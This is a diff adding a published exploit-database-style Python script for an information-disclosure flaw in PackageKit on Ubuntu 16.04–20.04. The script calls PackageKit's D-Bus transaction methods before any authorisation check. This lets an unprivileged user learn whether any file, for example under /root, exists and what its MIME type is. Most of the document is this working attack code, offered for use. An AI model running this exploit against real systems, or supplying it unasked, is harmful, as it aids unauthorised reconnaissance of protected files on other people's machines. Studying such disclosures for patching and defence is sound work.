@@ -1,0 +1,62 @@
+# Exploit Title: File Existence Disclosure in PackageKit < 1.1.13-2ubuntu1
+# Date: 2020-10-27
+# Exploit Author: Vaisha Bernard (vbernard - at - eyecontrol.nl)
+# Vendor Homepage: https://www.freedesktop.org/software/PackageKit/
+# Software Link: https://www.freedesktop.org/software/PackageKit/
+# Version: <= 1.1.1+bzr982-0ubuntu32.1
+# Tested on: Ubuntu 20.04
+#
+#!/usr/bin/env python3
+#
+# Ubuntu 16.04 - 20.04 
+# PackageKit <= 1.1.13-2ubuntu1
+# Sensitive Information Disclosure
+# 
+#
+# Reference: https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html
+#
+# The InstallFiles, GetFilesLocal and GetDetailsLocal methods 
+# of the d-bus interface to PackageKit accesses given files 
+# before checking for authorization. This allows non-privileged 
+# users to learn the MIME type of any file on the system.
+# 
+# Example in attached Python script:
+# 
+# $ python3 test_file_exists_pk.py /root/.bashrc
+# File exists and is of MIME type: 'text/plain'
+# 
+# $ python3 test_file_exists_pk.py /root/.bashrca
+# File does not exist
+#
+#
+import dbus
+import os
+import sys
+import re
+
+if len(sys.argv) != 2:
+	print("Checks if file exists and returns MIME type")
+	print("Usage: %s <file>")
+	sys.exit(0)
+
+FILE_TO_CHECK = sys.argv[1]
+
+bus = dbus.SystemBus()
+apt_dbus_object = bus.get_object("org.freedesktop.PackageKit", "/org/freedesktop/PackageKit")
+apt_dbus_interface = dbus.Interface(apt_dbus_object, "org.freedesktop.PackageKit")  
+
+trans = apt_dbus_interface.CreateTransaction()
+
+apt_trans_dbus_object = bus.get_object("org.freedesktop.PackageKit", trans)
+apt_trans_dbus_interface = dbus.Interface(apt_trans_dbus_object, "org.freedesktop.PackageKit.Transaction")
+
+try:
+	apt_trans_dbus_interface.InstallFiles(0, [FILE_TO_CHECK])
+	# ALSO apt_trans_dbus_interface.GetFilesLocal([FILE_TO_CHECK])
+	# ALSO apt_trans_dbus_interface.GetDetailsLocal([FILE_TO_CHECK])
+except dbus.exceptions.DBusException as e:
+	if "No such file" in str(e):
+		print("File does not exist")
+	elif "MimeTypeNotSupported" in str(e):
+		result = re.search('MIME type (.*) not supported', str(e))
+		print("File exists and is of MIME type: " + result.group(1))
